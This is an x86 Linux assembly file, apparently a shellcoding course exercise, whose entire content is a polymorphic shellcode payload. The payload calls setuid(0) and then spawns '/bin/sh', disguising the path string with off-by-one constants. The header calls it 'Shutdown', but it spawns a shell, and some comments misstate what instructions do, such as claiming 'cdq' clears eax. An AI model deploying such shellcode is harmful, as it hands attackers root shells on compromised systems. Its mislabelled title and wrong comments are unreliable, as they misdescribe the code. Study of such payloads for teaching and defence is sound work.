; SLAE Assigment 6 - Polymorphic shellcode 2 (Shutdown)
; Author: rtmcx (rtmcx@protonmail.com)
; 
; Executes "setuid(0)" and executes "/bin/sh"


global _start
section .text
_start:
	; execute setuid(0)
	cdq					; Clear eax,
	mov ebx, eax		; and ebx
	add al, 0x17 		; Syscall 0x17 (sys_setuid16)
	int 0x80 			; Execute syscall

	; Execute 'execve("/bin/sh")'
	xor eax, eax 		; clear eax
	mov edx, eax 		; and edx
	add al, 0xb			; Syscall 0x0B (Execve)
	push edx			; push 0
	mov edi, 0x68732f6d	; 'hs/m' 
	add edi, 0x1		; Add one the get correct string
	push edi			; push to the stack
	mov edi, 0x69622f2e	; 'ib/.'
	add edi, 0x1		; Add one to get corect string
	push edi			; push string to the stack
	mov ebx, esp		; Get address to string, set in ebx
	push edx			; push 0 	
	push ebx			; push 0
	mov ecx, esp		; Get address to array, set in ecx
	int 0x80			; Execute syscall
